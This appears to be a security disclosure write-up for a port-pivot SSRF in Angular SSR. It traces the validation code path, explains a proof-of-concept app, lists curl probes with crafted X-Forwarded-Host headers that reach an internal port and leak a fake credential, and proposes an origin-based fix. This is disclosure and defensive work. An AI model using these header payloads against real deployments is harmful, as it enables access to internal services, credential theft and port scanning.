# Angular SSR port pivot SSRF - code walkthrough and PoC explanation

This document walks through two things:

1. The data flow from an inbound HTTP request to the outbound fetch that reaches an attacker-chosen port, with the exact file and line where each check runs and where the gap sits.
2. Each file in the PoC and the role it plays in making the exploit reproducible and the result unambiguous.

---

## Part 1 - Why the code is vulnerable

### 1.1 Inbound request

The target is a standard Angular SSR application deployed behind a reverse proxy that forwards standard headers:

```
GET / HTTP/1.1
Host: proxy.example.com
X-Forwarded-Host: app.example.com
X-Forwarded-Port: 443
X-Forwarded-Proto: https
```

Node's `http` server hands the request to the Express middleware chain in `server.ts`, which forwards it to `AngularNodeAppEngine.handle()`. That converts the Node `IncomingMessage` into a Web standard `Request` and calls into the validation pipeline.

### 1.2 `createRequestUrl` builds the base URL from attacker-controlled headers

File: `packages/angular/ssr/node/src/request.ts:80-106`

```ts
export function createRequestUrl(nodeRequest: IncomingMessage | Http2ServerRequest): URL {
  const { headers, socket, url = '', originalUrl } = nodeRequest as IncomingMessage & { originalUrl?: string };

  const protocol =
    getFirstHeaderValue(headers['x-forwarded-proto']) ??
    ('encrypted' in socket && socket.encrypted ? 'https' : 'http');

  const hostname =
    getFirstHeaderValue(headers['x-forwarded-host']) ?? headers.host ?? headers[':authority'];

  let hostnameWithPort = hostname;
  if (!hostname?.includes(':')) {
    const port = getFirstHeaderValue(headers['x-forwarded-port']);
    if (port) {
      hostnameWithPort += `:${port}`;
    }
  }

  return new URL(`${protocol}://${hostnameWithPort}${originalUrl ?? url}`);
}
```

Every input here is attacker-controlled: `X-Forwarded-Proto`, `X-Forwarded-Host`, `X-Forwarded-Port`, and the request path. The function produces a URL that will be used as the request's own "external" view of itself. Two equivalent shapes produce an attacker-chosen port:

- Two-header form: `X-Forwarded-Host: app.example.com` + `X-Forwarded-Port: 13306`. `hostname` has no colon, so the port from `X-Forwarded-Port` is appended. Result: `http://app.example.com:13306/`.
- Inline form: `X-Forwarded-Host: app.example.com:13306`. `hostname` already contains a colon, so the port-append branch is skipped and the raw value flows through. Result: same URL.

### 1.3 `validateHeaders` accepts any numeric port

File: `packages/angular/ssr/src/utils/validation.ts:268-293`

```ts
const VALID_PORT_REGEX = /^\d+$/;
const VALID_HOST_REGEX = /^[a-z0-9_.-]+(:[0-9]+)?$/i;
const HOST_HEADERS_TO_VALIDATE: ReadonlySet<string> = new Set(['host', 'x-forwarded-host']);

function validateHeaders(request: Request): void {
  const headers = request.headers;

  for (const headerName of HOST_HEADERS_TO_VALIDATE) {
    const headerValue = getFirstHeaderValue(headers.get(headerName));
    if (headerValue && !VALID_HOST_REGEX.test(headerValue)) {
      throw new Error(`Header "${headerName}" contains characters that are not allowed.`);
    }
  }

  const xForwardedPort = getFirstHeaderValue(headers.get('x-forwarded-port'));
  if (xForwardedPort && !VALID_PORT_REGEX.test(xForwardedPort)) {
    throw new Error('Header "x-forwarded-port" must be a numeric value.');
  }
  // ... x-forwarded-proto / x-forwarded-prefix checks
}
```

Two things to notice:

- `VALID_PORT_REGEX = /^\d+$/` accepts any string of digits. `22`, `3306`, `6379`, `13306`, `65535` all pass. There is no upper bound and no allowlist.
- `VALID_HOST_REGEX` has an optional `(:[0-9]+)?` group. The inline form `app.example.com:13306` in `X-Forwarded-Host` passes this regex without issue.

The regex is a syntax check. It rejects non-numeric junk. It does not constrain which ports a deployment is willing to serve.

### 1.4 `validateUrl` reads `hostname` but not `port`

File: `packages/angular/ssr/src/utils/validation.ts:81-86`

```ts
export function validateUrl(url: URL, allowedHosts: ReadonlySet<string>): void {
  const { hostname } = url;                        // port is never destructured
  if (!isHostAllowed(hostname, allowedHosts)) {
    throw new Error(`URL with hostname "${hostname}" is not allowed.`);
  }
}
```

This is the point where the port dimension leaves the validation path. By WHATWG URL semantics:

```js
new URL('http://app.example.com:13306/').hostname  // "app.example.com"
new URL('http://app.example.com:13306/').port      // "13306"
new URL('http://app.example.com:13306/').origin    // "http://app.example.com:13306"
```

`url.hostname` returns only the host component. `url.port` is a separate string. `url.origin` is the RFC 6454 tuple (scheme, host, port).

The validator destructures only `hostname`. The port attribute of the URL is not read, not compared, and not stored for any later comparison. From this line on, the port is attacker-controlled with no remaining check.

### 1.5 `isHostAllowed` is string-equality on hostname

File: `packages/angular/ssr/src/utils/validation.ts:243-260`

```ts
function isHostAllowed(hostname: string, allowedHosts: ReadonlySet<string>): boolean {
  if (allowedHosts.has('*') || allowedHosts.has(hostname)) {
    return true;
  }
  for (const allowedHost of allowedHosts) {
    if (!allowedHost.startsWith('*.')) continue;
    const domain = allowedHost.slice(1);
    if (hostname.endsWith(domain)) return true;
  }
  return false;
}
```

`allowedHosts.has(hostname)` is a `Set<string>` lookup. If `allowedHosts = {"app.example.com"}` and a request arrives with URL `http://app.example.com:13306/`:

- `url.hostname === "app.example.com"` matches.
- Port `13306` is not part of this comparison.

A user who reads the docs and tries to harden by writing `allowedHosts: ["app.example.com:443"]` does not get port enforcement. They get a broken deployment: `allowedHosts.has("app.example.com:443")` is compared against `url.hostname` (which is the bare `"app.example.com"` without the port), the match fails, every legitimate request is rejected with `400`, and the SSR endpoint falls back to client-side rendering. There is no configuration syntax exposed to the user that constrains the port.

### 1.6 The poisoned Request propagates into SSR

File: `packages/angular/ssr/src/utils/validation.ts:62-71`

```ts
export function validateRequest(request: Request, allowedHosts: ReadonlySet<string>, ...): ... {
  validateHeaders(request);
  validateUrl(new URL(request.url), allowedHosts);
  return cloneRequestAndPatchHeaders(request, allowedHosts);
}
```

The checks return without raising. The `Request` object keeps its URL `http://app.example.com:13306/`. The engine passes this Request to the application.

### 1.7 Angular's `REQUEST` token receives the poisoned URL

File: `packages/angular/ssr/src/app.ts:308-323`

`AngularServerApp.handle()` injects the validated `Request` into the application's dependency-injection tree as the `REQUEST` token. Any component or service that does `inject(REQUEST)` gets this Request with `url = "http://app.example.com:13306/"`.

### 1.8 `HttpClient` with `withFetch()` uses the REQUEST origin for relative URLs

`provideServerRendering()` wires up the HTTP backend for SSR. When `HttpClient` is configured with `provideHttpClient(withFetch())`, relative URLs are resolved against the REQUEST origin.

The call `this.http.get('/api/internal')` expands as:

```js
new URL('/api/internal', 'http://app.example.com:13306/').href
// "http://app.example.com:13306/api/internal"
```

The fetch is issued over TCP from the SSR process to port `13306` of the allowlisted host. If anything is listening there, its response becomes the value of the Observable. The component template renders that value into the HTML. The server returns that HTML to the attacker.

### 1.9 Summary of the gap

The validator treats "host" as the unit of policy. An HTTP origin is (scheme, host, port). The port dimension of the origin is read from an attacker-controlled header, is not validated against any allowlist, and reaches a sink (server-side relative fetch) that renders the result back into an attacker-visible response. No single check is wrong, but together they do not enforce the security boundary the allowlist purports to provide.

---

## Part 2 - The PoC, file by file

The PoC is a default `ng new --ssr` scaffold with five minimal edits. Nothing about it is Angular-internal or custom-bootstrapped. It mirrors what a real deployment looks like.

### 2.1 `app.ts` - the exfiltration path

```ts
@Component({
  selector: 'app-root',
  imports: [AsyncPipe],
  template: `<pre id="secret">{{ secret$ | async }}</pre>`,
})
export class App {
  private readonly http = inject(HttpClient);
  readonly secret$ = this.http
    .get('/api/internal', { responseType: 'text' })
    .pipe(
      map((r) => `API_RESPONSE=${r}`),
      catchError((e) => of(`API_ERROR=${String(e)}`)),
    );
}
```

The component injects `HttpClient`, issues a relative `GET /api/internal`, and renders the response text inside a `<pre id="secret">` element. The `AsyncPipe` causes Angular to await the observable during SSR.

`map((r) => 'API_RESPONSE=' + r)` prefixes successful responses with a distinctive token so `grep -oE 'API_[A-Z]+=[^<]*'` can pick the body out of the HTML without parsing.

`catchError` returning `API_ERROR=...` gives a useful secondary signal: when the attacker points to a closed port, the observable emits an error and the attacker sees `API_ERROR=...` in the HTML. This turns the bug into a port scanner against the allowlisted host as well.

### 2.2 `app.config.ts` - enables the fetch backend

```ts
providers: [
  provideBrowserGlobalErrorListeners(),
  provideRouter(routes),
  provideClientHydration(withEventReplay()),
  provideHttpClient(withFetch()),
]
```

`provideHttpClient(withFetch())` makes `HttpClient` use `globalThis.fetch` as its transport. The fetch backend resolves relative URLs against the current document origin, which in SSR is the REQUEST origin. Without this, `HttpClient` falls back to `XhrBackend`, which does not have the same relative-to-REQUEST semantics under Node, and the exploit surface would not reach.

This is the default recommendation in Angular's own SSR docs. Any project following the canonical setup will have this provider.

### 2.3 `app.routes.server.ts` - per-request SSR instead of prerender

```ts
export const serverRoutes: ServerRoute[] = [
  { path: '**', renderMode: RenderMode.Server },
];
```

The scaffold default is `RenderMode.Prerender`, which bakes the rendered HTML during `ng build`. A prerendered route ignores request headers at runtime, because the rendering already happened. The vulnerability requires per-request SSR, so the route config is switched to `RenderMode.Server`.

This is a realistic setting: any page that depends on authentication, session, or any request-specific data must use `Server` mode. User dashboards, logged-in views, personalized feeds, any page with dynamic SSR content.

Triagers who do not change this setting will see static HTML and miss the bug. The README calls this out explicitly so it cannot be overlooked.

### 2.4 `server.ts` - the decoy local route

```ts
app.get('/api/internal', (_req, res) => {
  res.type('text/plain').send('LOCAL_EXPRESS_ROUTE_SHOULD_NOT_BE_USED');
});
```

This Express route lives on the same process as the Angular SSR server, on port 4200. It serves a constant, recognizable string.

Its purpose is to distinguish two outcomes when reading the HTML response:

- If the exploit did not work, `HttpClient.get('/api/internal')` resolves against the SSR's own origin `http://127.0.0.1:4200`, hits this route, and the HTML contains `LOCAL_EXPRESS_ROUTE_SHOULD_NOT_BE_USED`.
- If the exploit worked, the fetch resolves against the attacker-chosen port, bypasses this route entirely, and the HTML contains whatever the attacker-chosen service returned.

Without the decoy, a failed pivot would produce a `404` from the SSR engine and the HTML would be hard to read. The decoy makes the "no pivot" outcome a specific string.

### 2.5 `victim.mjs` - the simulated internal service

```ts
http.createServer((req, res) => {
  console.log(`victim served ${req.method} ${req.url}`);
  res.end('INTERNAL_SECRET_CREDS=aws_key=AKIAXXXXXXXX');
}).listen(13306, '127.0.0.1');
```

A plain Node HTTP server on `127.0.0.1:13306` returning a recognizable string. Port 13306 stands in for a database or internal admin port on the same host as the SSR process. Any port is equivalent, the number is arbitrary.

The `console.log` line is evidence. If a request lands here, the line appears in the victim log, proving a TCP connection was established from the SSR process to port 13306.

### 2.6 `angular.json.patch` - the "safe" documented configuration

```diff
-              "allowedHosts": []
+              "allowedHosts": ["127.0.0.1"]
```

The scaffold default is an empty allowlist. That config rejects every inbound request during validation and falls back to CSR, making SSR non-functional. Users are forced to fill in `allowedHosts` for SSR to work at all. The canonical restrictive configuration is a bare hostname.

The PoC uses exactly this configuration because it is:

- The only form that makes SSR actually serve per-request HTML.
- The form the Angular security docs recommend as restrictive.
- The form that is vulnerable to the bug.

Wildcard (`["*"]`) also makes SSR work but is explicitly documented as insecure. Port-qualified entries like `["127.0.0.1:4200"]` do not work at all. The set of functional configurations is a subset of the vulnerable configurations.

### 2.7 The three probes and what each rules out

The probes are designed so that their combined outputs leave only one consistent explanation: the port is unvalidated.

**Probe A - baseline**

```
curl -s http://127.0.0.1:4200/
→ API_RESPONSE=LOCAL_EXPRESS_ROUTE_SHOULD_NOT_BE_USED
```

With no attacker headers, the SSR HttpClient resolves `/api/internal` against its own origin. The decoy answers. The HTML does not contain the victim's data.

This rules out the hypothesis that the application returns the victim string under all conditions. The PoC app is not rigged.

**Probe B - exploit**

```
curl -s http://127.0.0.1:4200/ -H 'X-Forwarded-Host: 127.0.0.1:13306'
→ API_RESPONSE=INTERNAL_SECRET_CREDS=aws_key=AKIAXXXXXXXX
```

One header. The HTML now contains the victim's data. The victim server's log records `victim served GET /api/internal`, confirming that a TCP request reached port 13306. The SSR server's log does not show a `[decoy]` line for this request, confirming the HttpClient did not hit the own-origin route.

The payload is one inline `X-Forwarded-Host` value that passes the host regex. A two-header variant (`X-Forwarded-Host: 127.0.0.1` + `X-Forwarded-Port: 13306`) produces the same result.

**Probe C - control on the hostname allowlist**

```
curl -s http://127.0.0.1:4200/ -H 'X-Forwarded-Host: evil.com:13306'
→ URL with hostname "evil.com" is not allowed.
```

The SSR server rejects with a 400 and the canonical Angular error message. The validator is functioning against unknown hostnames. This rules out "the validator is broken across the board".

**Joint conclusion**

A alone says "the app does not hand out the victim string by default". B alone says "under attacker control, the victim string appears". C alone says "the hostname check works". Together they isolate the defect to the port dimension: the hostname gate works, the per-request rendering pipeline is wired correctly, the fetch reaches the attacker-chosen port because no check constrains the port.

### 2.8 Variants that further harden the claim

During auditing the following variants were tested against the same canonical `ng build`:

- Different target port (19999 instead of 13306, with a distinct listener returning a distinct string). Same outcome, attacker-chosen content in the HTML. Rules out hardcoded port behavior.
- `allowedHosts: ["127.0.0.1:4200"]` port-qualified. SSR non-functional for every request. Confirms the lack of a supported port-restricting configuration.
- `allowedHosts: ["*"]` wildcard. Same exploit works with any hostname, not just the allowlisted one. Confirms the wildcard is an explicit escape hatch.
- Target port that is not listening. Observable emits an error. HTML contains `API_ERROR=...`. The gadget doubles as a port probe against the allowlisted host.

No configuration available through the Angular SSR `allowedHosts` mechanism prevents the exploit without also breaking the SSR endpoint.

---

## Part 3 - Where the fix belongs

The minimal fix is to change `validateUrl` and `isHostAllowed` so they enforce origin equality rather than hostname equality.

```ts
export function validateUrl(url: URL, allowedHosts: ReadonlySet<string>): void {
  if (!isOriginAllowed(url, allowedHosts)) {
    throw new Error(`URL with origin "${url.origin}" is not allowed.`);
  }
}

function isOriginAllowed(url: URL, allowed: ReadonlySet<string>): boolean {
  if (allowed.has('*')) return true;

  const hostWithPort = url.port ? `${url.hostname}:${url.port}` : url.hostname;
  if (allowed.has(hostWithPort)) return true;

  // Bare hostname entries match only the scheme's default port.
  if (!url.port && allowed.has(url.hostname)) return true;

  for (const entry of allowed) {
    if (!entry.startsWith('*.')) continue;
    const domain = entry.slice(1);
    if (url.hostname.endsWith(domain)) return true;
  }

  return false;
}
```

With this change, the existing `allowedHosts: ["127.0.0.1"]` entry means "the host 127.0.0.1 on the scheme's default port only". To allow traffic on port 4200, a user writes `allowedHosts: ["127.0.0.1:4200"]`. The attacker's `X-Forwarded-Host: 127.0.0.1:13306` no longer matches.

The schema documentation for `security.allowedHosts` should be updated to state that bare hostname entries default to the scheme's default port, and that port-qualified entries are supported.
